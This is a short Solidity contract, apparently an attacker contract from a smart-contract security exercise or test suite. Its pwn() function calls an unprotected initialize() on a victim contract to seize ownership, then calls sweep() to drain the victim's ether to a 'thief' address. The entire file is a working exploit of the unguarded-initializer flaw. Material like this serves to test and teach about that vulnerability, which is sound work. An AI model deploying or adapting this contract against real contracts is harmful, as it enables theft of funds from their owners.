// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IInitVuln {
    function initialize(address owner_) external;
    function sweep(address payable to) external;
}

contract V1_AttackerInit {
    IInitVuln public immutable VICTIM;
    address public immutable THIEF;

    constructor(address victim_, address thief_) {
        VICTIM = IInitVuln(victim_);
        THIEF = thief_;
    }

    function pwn() external {
        // Take ownership by initializing first (or re-initializing)
        VICTIM.initialize(address(this));
        VICTIM.sweep(payable(THIEF));
    }

    receive() external payable {}
}